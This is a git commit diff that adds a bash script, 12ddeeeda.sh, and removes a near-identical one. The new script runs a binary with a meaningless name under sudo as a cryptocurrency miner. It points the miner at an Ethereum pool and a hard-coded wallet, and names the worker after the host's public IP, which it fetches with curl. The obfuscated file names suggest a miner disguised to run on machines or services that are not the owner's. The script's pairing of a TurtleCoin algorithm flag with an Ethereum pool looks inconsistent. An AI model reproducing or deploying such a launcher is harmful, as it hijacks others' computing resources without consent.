eacb39390917a6ca610b881d6318f2e75f0cf4a5
RIZAL ADITYA <70772802+Rizal07-adit@users.noreply.github.com>
2021-03-22 17:03:33 +0700

    new files

---
+++ 12ddeeeda.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=ethproxy+tcp://us1.ethermine.org:14444
+WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
+
+cd "$(dirname "$0")"
+
+chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a argon2id_chukwa2 -o $POOL -u $WALLET.$WORKER $@
--- payung.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=turtlecoin.herominers.com:10381
-WALLET=TRTLv2cdGxLUfaRzdoh1RMVDVdRu9Rdd1AimPesRzMrZFRjrPEB9exmAncNL3Kssyr9xxRsrjdYYZMvhJPpvo78H2gTUhZ93nra
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
-
-cd "$(dirname "$0")"
-
-chmod +x ./jukung && sudo ./jukung -a argon2id_chukwa2 -o $POOL -u $WALLET.$WORKER $@
